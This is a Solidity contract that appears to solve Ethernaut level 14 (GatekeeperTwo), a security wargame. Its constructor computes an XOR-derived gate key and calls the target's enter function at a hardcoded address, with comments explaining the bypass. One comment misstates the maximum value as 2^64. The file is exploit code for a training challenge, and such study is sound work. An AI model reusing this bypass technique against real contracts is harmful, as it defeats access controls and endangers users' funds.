//SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

contract EthernautLevel14 {
    ///To obtain the gate_key this time we have to use an XOR operation.
    ///The result of the XOR operation should be uint64(0) - 1 => which is 2^64 because of underflow.
    ///Since SafeMath is not used in this level there are no checks for overflow/underflow.
    ///A XOR B is a bitwise operation which checks each bit of A vs each bit of B and the resulting bit
    ///for the solution is 1 if A and B are different and 0 if A and B are the same.
    ///Basically A XOR B is 0xFFFFFFFFFFFFFFFF(2^64 in hexadecimal) only when A is B's complement(2's complement).
    ///And XOR also has the following property, if A XOR B = C => A XOR C = B
    ///So we can compute gateKey by doing the XOR of the older equation with the supposed solution(the mask).

    address gatekeeperTwoContractAddress =
        0x2b01f49a6cB14bd65FdD7A96a3908814d3aF2E10;
    uint64 mask = 0xFFFFFFFFFFFFFFFF;

    ///For msg.sender we have to use current contract address and not player address which in this case
    ///is tx.origin.
    uint64 gateKey =
        uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ mask;

    constructor() public {
        gatekeeperTwoContractAddress.call(
            abi.encodeWithSignature("enter(bytes8)", bytes8(gateKey))
        );
    }
}
